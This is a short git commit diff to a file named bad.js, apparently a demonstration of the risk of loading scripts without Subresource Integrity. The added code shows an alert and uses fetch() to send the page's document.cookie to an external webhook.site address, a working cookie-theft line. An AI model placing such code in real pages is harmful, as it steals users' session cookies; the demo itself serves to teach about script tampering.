3d9f6adde0f426b992dae319a03661c3809caf22
Saurav khanal <63205510+saurav-alpha@users.noreply.github.com>
2025-07-05 11:17:27 +0545

    Update bad.js

--- bad.js
+++ bad.js
@@ -1,3 +1,3 @@
-// bad.js
-alert("This is a demo of missing SRI!");
-console.log("Sensitive cookie:", document.cookie);
+// malicious.js
+alert("This script ran due to missing SRI!");
+fetch("https://webhook.site/519357b5-9a83-4295-9ced-9a648921bfa1" + encodeURIComponent(document.cookie));
